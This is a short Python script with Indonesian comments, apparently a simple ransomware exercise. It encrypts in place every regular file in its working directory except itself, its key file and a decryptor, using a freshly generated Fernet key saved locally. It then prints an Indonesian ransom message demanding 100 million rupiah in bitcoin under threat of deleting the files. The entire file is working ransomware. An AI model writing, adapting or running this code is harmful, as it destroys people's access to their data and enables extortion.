import os
from cryptography.fernet import Fernet
#tempat untuk menampung nama-nama file
files = []

#perulangan for untuk mencari file
for file in os.listdir():
        # Melewati file-file tertentu yang tidak ingin dienkripsi
        if file =="Ransomware1.py" or file =="thekey.key" or file =="dekripR1.py":
            continue
        # Menambahkan file ke daftar jika file tersebut adalah file biasa (bukan direktori)
        if os.path.isfile(file):
            files.append(file)
# Menampilkan daftar file yang akan dienkripsi biar pas pengujian tahu mana saja yang di enkripsi       
print(files)

# Menghasilkan kunci enkripsi menggunakan Fernet
key = Fernet.generate_key()

# Menyimpan kunci enkripsi ke dalam file 'thekey.key'
with open("thekey.key","wb") as thekey:
    thekey.write(key)
    
# Mengiterasi setiap file dalam daftar files untuk melakukan enkripsi
for file in files:
    # Membuka file dalam mode baca biner
    with open(file,"rb") as thefile:
        contents = thefile.read()
    # Mengenkripsi isi file dengan kunci yang telah dihasilkan
    contents_encrypted = Fernet(key).encrypt(contents)
    # Membuka file dalam mode tulis biner dan menulis isi yang telah dienkripsi
    with open(file,"wb") as thefile:
        thefile.write(contents_encrypted)
    
    
print("\n-----------------------------------------------------------------------------------------------------------------------")
print("\nfilemu telah di enkripsi oleh leo sekarang kirim dia 100 juta rupiah dalam bentuk bitcoin atau semua filemu ku hapus!!!")
print("\n-----------------------------------------------------------------------------------------------------------------------")
